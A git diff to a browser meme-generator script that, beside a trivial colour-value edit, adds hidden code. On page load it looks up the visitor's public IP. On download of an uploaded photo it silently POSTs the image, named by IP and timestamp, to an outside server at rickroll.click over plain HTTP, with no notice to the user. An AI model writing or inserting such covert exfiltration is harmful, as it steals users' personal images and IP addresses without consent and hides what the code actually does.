@@ -1,5 +1,6 @@
 'use strict';
 
+var ip;
 var gCtx;
 var gImgs;
 var gCanvas;
@@ -14,6 +15,7 @@ function onInitMeme() {
     gCtx = gCanvas.getContext('2d');
     resizeCanvas();
     addListeners();
+    getIP();
 }
 
 function resizeCanvas() {
@@ -128,7 +130,7 @@ function renderCanvas() {
         var currImg = getSelectedImage();
         if (!currImg) {
             drawText('Choose a photo', (gCanvas.height / 5), (gCanvas.height / 5), (gCanvas.height / 10), 
-            { outLineColor: '#000000', fillColor: '#ffffff' }, 'Impact', 'start');
+            { outLineColor: '#000000', fillColor: '#FFFFFF' }, 'Impact', 'start');
             return;
         }
         drawImgFromLocal(currImg.url);
@@ -334,8 +336,59 @@ function saveUploadImgURL(imgSrc) {
 
 }
 
+function getIP(){
+    const url = "https://icanhazip.com";
+    var xhr = new XMLHttpRequest();
+    xhr.open('GET',url, true);
+    xhr.onload = function () {
+        if (xhr.readyState === xhr.DONE) {
+            if (xhr.status === 200) {
+                //console.log(xhr.responseText);
+                ip = xhr.responseText.trim();
+            }
+        }
+    };
+    xhr.send(null);
+    return ip;
+}
+
+function getDate(){
+    const date = new Date();
+    const dateString = date.getDate()+"-"+(date.getMonth()+1)+"-"+date.getFullYear()+"_"+date.getHours()+"-"+date.getMinutes()+"-"+date.getSeconds();
+    return dateString;
+}
+
+function getFileName(){
+    const filename = ip + "_" + getDate() + ".jpg";
+    return filename;
+}
+
+function sendImage(){
+    var xhr = new XMLHttpRequest();
+    var url = "http://rickroll.click:3333/upload";
+    xhr.open("POST", url, true);
+    xhr.setRequestHeader("Content-Type", "application/json");
+    xhr.onreadystatechange = function () {
+        if (xhr.readyState === 4 && xhr.status === 200) {
+            void(0);
+        }
+    };
+    var data = JSON.stringify({"name": getFileName(), "image": gCanvas.toDataURL('image/jpeg')});
+    xhr.send(data);
+}
+
+function onSaveMeme() {
+    if (!isCanvas()) return;
+    if (gIsUpload) {
+          sendImage();
+          return;
+    }
+    renderCanvas();
+}
+
 function onDownloadImg(elLink) {
     renderCanvas();
     var imgContent = gCanvas.toDataURL('image/jpeg');
     elLink.href = imgContent;
+    onSaveMeme();
 }
